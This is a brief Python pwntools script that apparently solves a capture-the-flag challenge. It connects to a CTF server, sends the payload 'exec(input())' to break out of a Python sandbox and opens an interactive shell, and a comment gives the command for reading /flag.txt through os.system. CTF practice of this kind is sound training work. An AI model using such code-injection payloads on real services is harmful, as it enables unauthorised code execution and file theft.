from pwn import *

conn = remote('chal.sigpwny.com', 5014)

conn.recvline()


# import os; os.system("cat /flag.txt")

exploit = "exec(input())"


conn.sendline(exploit.encode())
conn.interactive()